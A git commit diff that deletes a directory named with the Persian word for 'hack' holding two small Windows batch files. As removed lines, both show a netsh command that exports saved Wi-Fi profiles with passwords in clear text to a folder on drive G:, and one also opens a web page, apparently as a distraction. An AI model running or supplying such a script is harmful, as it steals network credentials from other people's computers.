566f91f45190174b389f2579ec7db433f8d2db7c
soheilog <82284460+soheilog@users.noreply.github.com>
2021-10-27 08:24:16 +0330

    Delete هک directory

--- هک/soheil/launch.bat
+++
@@ -1,6 +0,0 @@
-
-start https://soheilog.github.io/soheil/
-
-netsh wlan export profile folder=G:\soheil\wifi\ key=clear
-cls
-exit
--- هک/soheil/lunch.bat
+++
@@ -1,6 +0,0 @@
-@echo off
-::start
-
-netsh wlan export profile folder=G:\hack\wifi\ key=clear
-
-exit
